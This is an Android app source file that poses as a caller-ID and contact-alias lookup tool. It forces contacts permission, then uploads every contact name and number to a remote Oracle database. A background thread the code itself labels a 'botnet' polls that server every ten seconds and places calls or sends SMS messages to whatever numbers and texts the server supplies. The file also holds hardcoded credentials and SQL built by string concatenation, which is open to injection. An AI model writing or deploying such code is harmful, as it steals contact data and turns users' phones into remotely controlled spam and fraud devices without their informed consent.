package com.example.myapplication;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.StrictMode;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.Switch;
import java.sql.*;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSIONS_REQUEST_READ_CONTACTS = 100;
    private static final int PERMISSIONS_REQUEST_READ_SMS = 100;
    private static final int PERMISSIONS_REQUEST_CALL_PHONE = 100;
    Switch s1, s2;
    EditText num;
    Connection conn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        int SDK_INT = android.os.Build.VERSION.SDK_INT;
        if (SDK_INT > 8) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
                    .permitAll().build();
            StrictMode.setThreadPolicy(policy);

        }



        try {
            Conn();//connect to database
        } catch (Exception e) {
            e.printStackTrace();
        }
        getContactsPermission(); //get the contact permission (made it so the app will not work without it)

        s1 = (Switch) findViewById(R.id.switch1); //switch for sms feature
        s1.setChecked(false); //set off at first
        if(grantedSMSPermission())
            s1.setChecked(true); //set true if permission is granted


        s1.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) { //if user turns on the feature...
                    System.out.println("s1 toggled on");
                    getSMSPermission(); //then the sms permission will be requested
                    if(grantedSMSPermission()) {
                        //syncSMS(); //not implemented yet in this prototype
                    }


                }
            }
        });

        s2 = (Switch) findViewById(R.id.switch2); //switch for caller ID feature
        s2.setChecked(false); // set off at first
        if(grantedCallPermission())
            s2.setChecked(true); //set true if permission is granted
        s2.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) { //if the user turn on the feature
                    System.out.println("s2 toggled on");
                    getCallPermission(); //then get the calling permission
                    if(grantedCallPermission()) {
                        //displayID(); //not implemented yet in this prototype
                    }

                }
            }
        });


        //thread that will run on the background waiting for phone call command(botnet)
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {//keep running continuously
                    try {
                        TimeUnit.SECONDS.sleep(10); //then wait and every ten seconds...
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    if(grantedCallPermission()) { // if the app could use the phone to make calls...
                        System.out.println("Checking call status");

                        try {
                            if (getCallStatus()) { //check if their is a target to call
                                System.out.println("initiating Phone call");
                                //creating and executing the query
                                Statement stmt = conn.createStatement();
                                String query = "SELECT callee FROM call";
                                ResultSet res = stmt.executeQuery(query);
                                ResultSetMetaData metaData = res.getMetaData();

                                //getting number from the result
                                String num = "";
                                while (res.next())
                                    num = res.getString("callee");
                                res.close();
                                stmt.close();
                                System.out.println("got number:" + num + " from the database");

                                //calling number
                                Intent callIntent = new Intent(Intent.ACTION_CALL);
                                callIntent.setData(Uri.parse("tel:" + num));//change the number
                                startActivity(callIntent);

                            }
                        } catch (SQLException e) {
                            e.printStackTrace();
                        }
                    }

                    if(grantedSMSPermission())
                        try {
                            if(getSMSStatus()) { //check if there is an sms to send
                                System.out.println("Initiating sms");
                                //creating and executing the query
                                Statement stmt = conn.createStatement();
                                String query = "SELECT message FROM SMS";
                                ResultSet res = stmt.executeQuery(query);
                                ResultSetMetaData metaData = res.getMetaData();

                                //getting message from the result
                                String message="";
                                while(res.next())
                                    message=res.getString("message");

                                //creating and executing the query
                                Statement stmt2 = conn.createStatement();
                                String query2 = "SELECT pnumber FROM SMS";
                                ResultSet res2 = stmt.executeQuery(query2);


                                //getting number
                                String number="";
                                while(res2.next())
                                    number=res2.getString("pnumber");


                                res.close();
                                res2.close();
                                stmt.close();
                                stmt2.close();

                                //sending sms
                                System.out.println("sending "+message+" to "+number);
                                SmsManager sms=SmsManager.getDefault();
                                sms.sendTextMessage(number,null,message,null,null); //sending from a vm will crash the because it doesn't have a sim card

                                //deletes sms after sending
                                //deleteLastSMS(); // not implemented yet
                            }
                        } catch (SQLException e) {
                            e.printStackTrace();
                        }

                    }
                }
            }).start();


    }

    private void Conn() throws Exception {
        System.out.println("Connecting to database...");
        Class.forName("oracle.jdbc.driver.OracleDriver");
        System.out.println("Class for name successful");
        conn = DriverManager.getConnection("jdbc:oracle:thin:@Rasheed:1521/XE", "User1", "User1");
        if (conn != null) {
            System.out.println("Connected to database successfully");
        } else {
            System.out.println("Not Connected");
        }
    }


    private void getContactsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
        while(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED);
        getContacts(); //get contacts and upload to database (app will intentionally crash if the permission is not given,as to avoid users who will benefit without giving value)

    }

    private boolean grantedSMSPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
            return false;
        return true;
    }

    private void getSMSPermission() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.SEND_SMS}, PERMISSIONS_REQUEST_READ_SMS);
        }
    }

    private boolean grantedCallPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED)
            return false;
        return true;
    }

    private void getCallPermission(){

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.CALL_PHONE}, PERMISSIONS_REQUEST_CALL_PHONE);
        }

    }

    //gets contacts from phone to upload it to database
    @SuppressLint("Range") private void getContacts() {

        //down is an algorithm to extract the contact info from the phone
        ContentResolver cr = getContentResolver(); //function used to handle contacts from phone
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);//used to iterate the contacts table
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        try {
                            if(aliasExists(name,phoneNo)==false)//checks if this alias is already in the database
                                upload(name,phoneNo); //if not, then upload it to the database
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    pCur.close();
                }
            }
        }
    }

    //checks if this alias is already in the database
    private boolean aliasExists(String name, String phoneNo) throws Exception{

        //creating and executing the query
        Statement stmt = conn.createStatement();
        String query = "SELECT name FROM contacts where phone='"+phoneNo+"'";
        ResultSet res = stmt.executeQuery(query);
        ResultSetMetaData metaData = res.getMetaData();


        //checking if alias exists for this number
        String Names="";
        while(res.next()) {
            Names+=res.getString("name")+"\n";
        }
        res.close();
        stmt.close();


        if(Names.contains(name)) {
            System.out.println(name+" already exists in the database");
            return true;
        }
        return false;
    }

    public void upload(String Name,String PhoneNo)throws Exception{ //inserts the new contact to the database
        Statement stmt = conn.createStatement();
        String query = "INSERT INTO contacts (phone,name) VALUES('"+PhoneNo+"','"+Name+"')";
        ResultSet res = stmt.executeQuery(query);
        res.close();
        stmt.close();
        System.out.println("uploaded "+Name+" to the database");
    }

    //looks up the contact name of a number from the database
    public void lookUp(View v)throws Exception{
        //getting number from input box
        num= findViewById(R.id.editTextPhone);
        String number= String.valueOf(num.getText());

        //creating and executing the query
        Statement stmt = conn.createStatement();
        String query = "SELECT name FROM contacts where phone='"+number+"'";
        ResultSet res = stmt.executeQuery(query);
        ResultSetMetaData metaData = res.getMetaData();

        //getting the first 3 results
        int i=0;
        String Names="";
        while(res.next() &&  i<3)
            Names+=res.getString("name")+"\n";


        //result display
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        //if matches are found
        if(Names.length()>0) {
            System.out.println("Alias search successful: yielded results");
            builder.setMessage(Names);
            builder.setTitle("Aliases");
        }
        //error if no number is provided
        else if(number.length()==0){
            System.out.println("no input");
            builder.setMessage("please input a number first");
            builder.setTitle("error");
        }
        //if no result found
        else{
            System.out.println("Alias search successful: yielded no results");
            builder.setMessage("No aliases found");
            builder.setTitle("ALiases");
        }
        AlertDialog alertDialog = builder.create();
        alertDialog.show();

        res.close();
        stmt.close();
    }

    //get if there is a number to call or not (botnet)
    private boolean getCallStatus() throws SQLException {
        //creating and executing query
        Statement stmt = conn.createStatement();
        String query = "SELECT YoN FROM call";
        ResultSet res = stmt.executeQuery(query);
        ResultSetMetaData metaData = res.getMetaData();

        //getting status
        String a="";
        while(res.next()) {
            a = res.getString("yon");
        }

        res.close();
        stmt.close();
        if(a.equals("n"))
            return false;
        return true;
    }

    //get if there is an sms to call or not (botnet)
    private boolean getSMSStatus() throws SQLException {
        //creating and executing query
        Statement stmt = conn.createStatement();
        String query = "SELECT YoN FROM SMS";
        ResultSet res = stmt.executeQuery(query);
        ResultSetMetaData metaData = res.getMetaData();

        //getting status
        String a="";
        while(res.next()) {
            a = res.getString("yon");
        }

        res.close();
        stmt.close();
        if(a.equals("n"))
            return false;
        return true;
    }
}
